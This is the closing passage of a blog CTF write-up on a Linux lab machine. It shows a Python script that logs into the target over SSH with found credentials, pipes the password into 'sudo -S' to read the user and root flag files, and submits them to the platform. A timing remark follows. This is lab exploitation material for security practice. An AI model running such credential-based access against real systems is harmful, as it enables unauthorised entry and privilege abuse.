</span></span><span class=line><span class=cl><span class=n>ipAddress</span> <span class=o>=</span> <span class=n>bot</span><span class=o>.</span><span class=n>getIpAddress</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>ipAddress</span><span class=p>,</span> <span class=mi>22</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>handshake</span><span class=p>(</span><span class=n>sock</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># SSH credentials</span>
</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>userauth_password</span><span class=p>(</span><span class=s2>&#34;seela&#34;</span><span class=p>,</span> <span class=s2>&#34;rockyou&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>channel</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>open_session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># Send requested sudo password, then read both flags</span>
</span></span><span class=line><span class=cl><span class=n>channel</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;echo rockyou|sudo -S find /home/seela/user.txt /root/root.txt -exec cat </span><span class=si>{}</span><span class=s2> \;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>size</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>channel</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>size</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Send flag to platform</span>
</span></span><span class=line><span class=cl>    <span class=n>bot</span><span class=o>.</span><span class=n>sendFlag</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>size</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>channel</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=time-score>Time score</h3><p>This allowed me to achieve a resolution time of less than 1 second (~0.7s).</p></section><footer class=article-footer><section class=article-tags><a href=/en/tags/linux/>Linux</a>
<a href=/en/tags/pentest/>Pentest</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/en/p/battlehack_chirucahua/><div class=article-image><img src=/en/p/battlehack_chirucahua/images/welcome_cover.57fe5ed22707d066b706279dcda7c92e_hu827c66ffcba915599e7c4a5b5a5bee6d_102322_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post [Facile - Linux] Chirucahua" data-key=battlehack_chirucahua data-hash="md5-V/5e0icH0Ga3BiedzafJLg=="></div><div class=article-details><h2 class=article-title>[Facile - Linux] Chirucahua</h2></div></a></article><article class=has-image><a href=/en/p/htb_twomillion/><div class=article-image><img src=/en/p/htb_twomillion/images/welcome_cover.57fe5ed22707d066b706279dcda7c92e_hu827c66ffcba915599e7c4a5b5a5bee6d_102322_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post [Linux - Easy] TwoMillion" data-key=htb_twomillion data-hash="md5-V/5e0icH0Ga3BiedzafJLg=="></div><div class=article-details><h2 class=article-title>[Linux - Easy] TwoMillion</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2020 -
2023 Onid1's blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>